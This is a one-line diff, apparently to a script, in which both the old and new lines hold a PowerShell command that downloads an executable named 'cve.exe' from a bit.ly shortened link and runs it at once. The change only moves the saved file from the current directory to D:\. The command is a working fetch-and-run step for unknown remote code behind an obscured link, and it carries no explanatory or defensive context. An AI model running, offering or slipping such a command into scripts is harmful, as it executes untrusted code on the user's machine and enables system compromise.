@@ -1,1 +1,1 @@
-powershell curl 'http://bit.ly/2FGJIZU' -OutFile '%cd%\cve.exe';Start-Process '%cd%\cve.exe'
+powershell curl 'http://bit.ly/2FGJIZU' -OutFile 'D:\cve.exe';Start-Process 'D:\cve.exe'
